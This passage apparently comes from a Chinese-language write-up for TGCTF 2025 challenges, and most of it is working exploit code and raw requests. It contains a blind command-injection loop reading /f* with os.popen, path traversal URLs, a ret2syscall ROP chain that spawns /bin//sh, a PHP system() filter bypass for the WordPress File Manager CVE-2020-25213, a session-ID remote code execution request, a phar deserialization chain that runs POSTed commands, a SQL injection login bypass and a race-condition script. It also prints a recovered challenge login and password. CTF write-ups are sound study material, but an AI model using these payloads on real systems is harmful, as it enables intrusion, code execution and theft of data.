    <span class="token keyword">for</span> s <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token operator">+</span><span class="token string">'&#123;'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"expr"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">],'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">'));1/a"</span></span><span class="token punctuation">&#125;</span>
        <span class="token comment"># res = requests.post(url, data=json)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment"># print(res.text, s)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text <span class="token operator">!=</span> <span class="token string">"A server error occurred.  Please contact the administrator."</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre>

<p>只要flag逐位是对的上的就会触发1&#x2F;0进而报错。否则就是1&#x2F;1正常。布尔盲注打完了。</p>
<h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a>直面天命</h3><p>&#x2F;hints发现有路由。爆破。打到&#x2F;aazz。可以传参。那就arjun扫。发现filename参数。</p>
<p>路径穿越出。</p>
<p><a target="_blank" rel="noopener" href="http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag">http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag</a></p>
<h3 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a>TG_wordpress</h3><p>&#x2F;robots.txt进去。看到&#x2F;.tmp&#x2F;vuln和&#x2F;.tmp&#x2F;.bak。.bak发现服务器在52013开了vuln服务（nc可以连）</p>
<p>ret2syscall 直接ROPgadgets可以一把梭。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./gets"</span><span class="token punctuation">)</span>
<span class="token comment">#io=remote()</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>

p <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">40</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000419484</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000044a5e5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000043d350</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000044a5e5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401f2f</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000047f2eb</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; pop rbx ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4141414141414141</span><span class="token punctuation">)</span> <span class="token comment"># padding</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000043d350</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471350</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401ce4</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>打到账密。TG_wordpressor, aXx^oV@K&amp;cFoVatzQ*</p>
<p>进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。</p>
<p>配置文件有过滤。可以使用如下绕过：</p>
<?= call_user_func('sys'.'tem', 'cat /f*'); ?>

<p>打进去就有了。</p>
<h3 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h3><p>没有禁止session相关。</p>
<p>payload:</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?tgctf2025&#x3D;session_id();session_start();system(hex2bin(session_id())); HTTP&#x2F;1.1
Host: node2.tgctf.woooo.tech:32385
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Cookie: PHPSESSID&#x3D;636174202f662a
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive</code></pre>

<h3 id="什么文件上传？（复仇）"><a href="#什么文件上传？（复仇）" class="headerlink" title="什么文件上传？（复仇）"></a>什么文件上传？（复仇）</h3><p>file_exists可以出发phar。易得：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
highlight_file(__FILE__);
error_reporting(0);

class yesterday &#123;
    public $learn;
    public $study&#x3D;&quot;study&quot;;
    public $try;
    public function __construct()
    &#123;
        $this-&gt;learn &#x3D; &quot;learn&lt;br&gt;&quot;;
    &#125;
    public function __destruct()
    &#123;
        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;
        return $this-&gt;study-&gt;hard();
    &#125;
&#125;
class today &#123;
    public $doing;
    public $did;
    public $done;
    public function __construct()&#123;
        $this-&gt;did &#x3D; &quot;What you did makes you outstanding.&lt;br&gt;&quot;;
    &#125;
    public function __call($arg1, $arg2)
    &#123;
        $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;
        echo $this-&gt;done;
        if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666)&#123;
            return $this-&gt;doing();
        &#125;
        else&#123;
            return $this-&gt;doing-&gt;better;
        &#125;
    &#125;
&#125;
class tommoraw &#123;
    public $good;
    public $bad;
    public $soso;
    public function __invoke()&#123;
        $this-&gt;good&#x3D;&quot;You&#39;ll be good tommoraw!&lt;br&gt;&quot;;
        echo $this-&gt;good;
    &#125;
    public function __get($arg1)&#123;
        $this-&gt;bad&#x3D;&quot;You&#39;ll be bad tommoraw!&lt;br&gt;&quot;;
    &#125;

&#125;
class future&#123;
    private $impossible&#x3D;&quot;How can you get here?&lt;br&gt;&quot;;
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) &#123;
        if ($this-&gt;out-&gt;useful7) &#123;
            echo &quot;Seven is my lucky number&lt;br&gt;&quot;;
            system(&#39;whoami&#39;);
        &#125;
    &#125;
    public function __toString()&#123;
        echo &quot;This is your future.&lt;br&gt;&quot;;
        system($_POST[&quot;wow&quot;]);
        return &quot;win&quot;;
    &#125;
    public function __destruct()&#123;
        $this-&gt;no &#x3D; &quot;no&quot;;
        return $this-&gt;no;
    &#125;
&#125;
$a &#x3D; new yesterday();
$a -&gt; study &#x3D; new today();
$a -&gt; study -&gt; doing &#x3D; new future();

&#x2F;&#x2F; 后缀必须为phar
$phar &#x3D; new Phar(&quot;evil.phar&quot;);
$phar-&gt;startBuffering();
&#x2F;&#x2F; 设置 stubb
$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
&#x2F;**
将自定义的 meta-data 存入 manifest
这个函数需要在php.ini中修改 phar.readonly 为 Off
否则的话会抛出 
creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly 
异常.
*&#x2F;
$$phar-&gt;setMetadata($$a);
&#x2F;&#x2F; 添加需压缩的文件
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
$phar-&gt;stopBuffering();

?&gt;</code></pre>

<p>随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
if(isset($_FILES[&#39;file&#39;])) &#123;
    $uploadDir &#x3D; &#39;uploads&#x2F;&#39;;
    if(!file_exists($uploadDir)) &#123;
        mkdir($uploadDir, 0777, true);
    &#125;

    &#x2F;&#x2F; 白名单允许的扩展名
    $allowedExtensions &#x3D; [&#39;atg&#39;];
    $fileName &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);
    $fileExtension &#x3D; strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    &#x2F;&#x2F; 检查文件扩展名
    if(!in_array($fileExtension, $allowedExtensions)) &#123;
        die(&quot;hacker！&quot;);
    &#125;

    $uploadFile &#x3D; $uploadDir . $fileName;

    if(move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadFile)) &#123;
        echo &quot;文件已保存到：$uploadFile ！&quot;;
    &#125; else &#123;
        echo &quot;文件保存出错！&quot;;
    &#125;
&#125;
?&gt;</code></pre>

<p>允许上传atg文件。</p>
<p>后面易得：</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;upload.php HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:30759
Content-Length: 940
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:30759
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary1OUR0mqZmZ8AtAOc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:30759&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary1OUR0mqZmZ8AtAOc
Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;evil.atg&quot;
Content-Type: application&#x2F;octet-stream

GIF89a&lt;?php __HALT_COMPILER(); ?&gt;
此处有不可见字符省略。内容为上述脚本生成的phar
POST &#x2F;class.php?filename&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;evil.atg&#x2F;test.txt HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:30759
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application&#x2F;x-www-form-urlencoded
Connection: keep-alive
Content-Length: 7

wow&#x3D;env</code></pre>

<h3 id="TGCTF-2025-后台管理"><a href="#TGCTF-2025-后台管理" class="headerlink" title="TGCTF 2025 后台管理"></a>TGCTF 2025 后台管理</h3><p>反斜杠转义字符串中的’，然后在password里打SQL注入。</p>
<p>误打误撞试出来flag在flag表里（（（</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;login HTTP&#x2F;1.1
Host: 124.71.147.99:9045
Content-Length: 48
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;124.71.147.99:9045
Content-Type: application&#x2F;x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;124.71.147.99:9045&#x2F;login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username&#x3D;1\&amp;password&#x3D;union select *,2 from flag#</code></pre>

<p>在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}</p>
<h3 id="老登，炸鱼来了？"><a href="#老登，炸鱼来了？" class="headerlink" title="老登，炸鱼来了？"></a>老登，炸鱼来了？</h3><p>竞争safe变量。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> aiohttp
<span class="token keyword">import</span> asyncio
<span class="token keyword">import</span> time

<span class="token keyword">class</span> <span class="token class-name">Solver</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> baseUrl<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>baseUrl <span class="token operator">=</span> baseUrl
        self<span class="token punctuation">.</span>READ_FILE_ENDPOINT <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>baseUrl<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        self<span class="token punctuation">.</span>VALID_CHECK_PARAMETER <span class="token operator">=</span> <span class="token string">'/write?name=123.md&amp;content=flag&amp;format=markdown'</span>
        self<span class="token punctuation">.</span>INVALID_CHECK_PARAMETER <span class="token operator">=</span> <span class="token string">'/read?name=../../../../../flag'</span>
        self<span class="token punctuation">.</span>RACE_CONDITION_JOBS <span class="token operator">=</span> <span class="token number">100</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">setSessionCookie</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">await</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>baseUrl<span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">raceValidationCheck</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>READ_FILE_ENDPOINT<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>parameter<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">as</span> response<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">raceCondition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">:</span>
        tasks <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>RACE_CONDITION_JOBS<span class="token punctuation">)</span><span class="token punctuation">:</span>
            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>raceValidationCheck<span class="token punctuation">(</span>session<span class="token punctuation">,</span> self<span class="token punctuation">.</span>VALID_CHECK_PARAMETER<span class="token punctuation">)</span><span class="token punctuation">)</span>
